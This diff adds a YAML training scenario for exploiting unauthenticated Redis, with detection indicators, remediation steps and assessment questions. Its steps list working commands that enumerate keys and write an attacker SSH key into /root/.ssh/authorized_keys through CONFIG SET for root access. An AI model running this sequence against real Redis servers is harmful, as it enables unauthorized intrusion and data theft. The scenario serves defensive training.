@@ -1,0 +1,107 @@
+# Category: Database Security
+name: "Redis Unauthenticated Access – Data Theft and RCE"
+id: "database-redis-unauth-001"
+category: "database_security"
+subcategory: "redis"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit Redis instances that are exposed without authentication (default
+  config) to steal data, modify keys, or achieve remote code execution via
+  the `CONFIG SET` command to write a cron job or SSH key.
+
+learning_objectives:
+  - Understand Redis architecture and default configuration
+  - Use redis-cli to connect and enumerate keys
+  - Write arbitrary files via Redis CONFIG SET
+  - Gain shell access by writing SSH keys or cron jobs
+
+tools:
+  - redis-cli
+  - Python (redis-py)
+  - Metasploit (redis exploit module)
+
+prerequisites:
+  - Redis instance accessible on port 6379
+  - No password set
+
+steps:
+  - id: "step1"
+    phase: "connection"
+    action: "Connect to Redis without auth"
+    commands:
+      - "# Using redis-cli"
+      - "redis-cli -h <TARGET_IP> -p 6379"
+      - "# Or just telnet"
+      - "telnet <TARGET_IP> 6379"
+      - "# Then send PING"
+    expected_output: "PONG response"
+    detection: "Redis logs show connection from unusual IP"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "List keys and configurations"
+    commands:
+      - "# Get all keys"
+      - "KEYS *"
+      - "# Get config"
+      - "CONFIG GET *"
+      - "# Get server info"
+      - "INFO"
+    expected_output: "List of stored data and server config (dir, dbfilename)"
+    detection: "Redis logs show KEYS and CONFIG commands"
+
+  - id: "step3"
+    phase: "rce"
+    action: "Write SSH key or cron job"
+    commands:
+      - "# Set dir to /root/.ssh/"
+      - "CONFIG SET dir /root/.ssh/"
+      - "# Set dbfilename to authorized_keys"
+      - "CONFIG SET dbfilename authorized_keys"
+      - "# Inject public key"
+      - "SET key 'ssh-rsa AAA... attacker@host'"
+      - "# Save"
+      - "SAVE"
+    expected_output: "SSH key written; can log in as root"
+    detection: "Writing to .ssh directory may be flagged by host intrusion detection"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "CIS Redis Benchmarks"
+    control: "1.1"
+    description: "Set a password for Redis"
+
+detection:
+  network_indicators:
+    - "Traffic to port 6379 from unexpected sources"
+  log_indicators:
+    - "Redis log with `CONFIG SET` and `SAVE` commands"
+  endpoint_indicators:
+    - "New files in /root/.ssh/"
+
+remediation:
+  immediate:
+    - "Set a strong password (requirepass) or use UNIX socket authentication"
+    - "Bind Redis to localhost only, or firewall restrict"
+  long_term:
+    - "Use TLS for Redis connections"
+    - "Regularly audit Redis configurations"
+
+variables:
+  target_ip: "10.0.0.10"
+  public_key: "ssh-rsa AAA... attacker@host"
+
+assessment_questions:
+  - "What are the default Redis ports and config?"
+  - "How can you use Redis to write files to the filesystem?"
+  - "Why is it dangerous to have Redis exposed without auth?"
+
+references:
+  - url: "https://redis.io/docs/manual/security/"
+    title: "Redis Security"
+  - url: "https://www.exploit-db.com/exploits/48260"
+    title: "Redis RCE via CONFIG SET"
